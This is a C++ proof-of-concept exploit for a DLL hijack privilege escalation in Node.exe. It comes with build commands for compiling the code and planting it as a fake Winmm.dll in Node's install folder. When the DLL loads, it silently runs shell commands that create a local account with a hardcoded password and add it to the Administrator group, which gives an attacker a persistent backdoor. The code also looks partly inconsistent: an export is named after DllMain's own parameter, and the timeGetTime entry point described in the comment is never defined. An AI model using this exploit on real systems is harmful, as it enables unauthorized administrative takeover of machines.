/* 
Author: Morgan Storey (@MorganKStorey)
 Credit: Felipe Molina (@felmoltor)


Vulnerability discovered by Morgan Storey (secme) node-vulne at morganstorey.com

Https://security.morganstorey.com
Node.Exe DLL Hijack Privilege Escalation POC.
This dll will suplant the legitimate library "Winmm.dll" residing inside 
the default installation folder of Node.exe if you have write access to the path
open minggw and cd into the dir with your node.exe and privesc.dll.cpp
g++ -c -DPRIVESC_DLL privesc.dll.cpp & g++ -shared -o privesc.dll privesc.dll.o -Wl,--out-implib,main.a & copy /y privesc.dll Winmm.dll

includes ajusted here to allow for timeGetTime to be used as an entry point
*/
#include <windef.h>
#include <stdio.h>
#include <WinBase.h>
//entrypoint timeGetTime below for Node to hit... repeatedly
extern "C" __declspec(dllexport) int fdwReason() {
 WinExec("cmd.exe /C if not exist c:\windows\ms-admin.log net user ms-admin PW-Privesc#1 /add >NUL 2>&1", 0);
 WinExec("cmd.exe /C if not exist c:\windows\ms-admin.log net localgroup Administrator ms-admin /add >NUL 2>&1", 0);
 WinExec("cmd.exe /C if not exist c:\windows\ms-admin.log echo %time% %date% >> c:\windows\ms-admin.log", 0);
 return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 fdwReason();
 return TRUE;
}
